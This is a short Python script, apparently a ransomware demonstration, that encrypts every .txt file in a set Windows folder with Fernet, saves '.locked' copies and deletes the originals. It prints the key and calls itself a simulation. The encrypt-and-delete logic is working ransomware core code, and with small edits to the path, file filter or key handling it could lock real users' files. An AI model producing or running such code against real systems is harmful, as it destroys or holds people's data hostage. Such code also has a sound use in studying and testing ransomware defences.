from cryptography.fernet import Fernet
import os

def generate_key():
    return Fernet.generate_key()

def encrypt_files(folder, key):
    cipher = Fernet(key)
    for filename in os.listdir(folder):
        if filename.lower().endswith(".txt"):

            filepath = os.path.join(folder, filename)
            with open(filepath, "rb") as file:
                data = file.read()
            encrypted_data = cipher.encrypt(data)
            with open(filepath + ".locked", "wb") as file:
                file.write(encrypted_data)
            os.remove(filepath)
    print("Files encrypted successfully.")

def main():
    folder = r"C:\Users\USER 1\testfiles"
    key = generate_key()
    print(f"Save this key to decrypt your files:\n{key.decode()}\n")
    encrypt_files(folder, key)
    print("Your files have been encrypted! This is a simulation.")

if __name__ == "__main__":
    main()
